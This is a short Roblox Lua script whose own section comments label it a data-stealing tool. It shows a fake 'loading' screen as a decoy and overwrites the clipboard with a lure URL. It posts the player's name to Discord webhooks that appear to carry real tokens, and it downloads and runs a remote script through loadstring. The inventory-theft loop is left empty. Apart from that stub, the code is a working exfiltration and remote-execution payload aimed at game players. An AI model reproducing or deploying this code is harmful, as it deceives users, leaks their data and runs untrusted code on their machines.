-- 1. Import Roblox Services
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- 2. Webhook URLs (for data exfiltration)
local webhook1 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"
local webhook2 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"

-- 3. Fake GUI Message
local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame", gui)
local label = Instance.new("TextLabel", frame)
label.Text = "SCRIPT LOADING... Stuck at 100%"

-- 4. Stealing Player Inventory
local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        -- Steal or log item names
    end
end

-- 5. Clipboard Hijack
setclipboard("https://kebabman.vercel.app/start?...")

-- 6. HTTP Post to Discord Webhook
HttpService:PostAsync(webhook1, HttpService:JSONEncode({
    username = "Logger",
    content = "Player has joined: " .. player.Name,
}))

-- 7. Remote Script Execution
loadstring(game:HttpGet("https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source"))()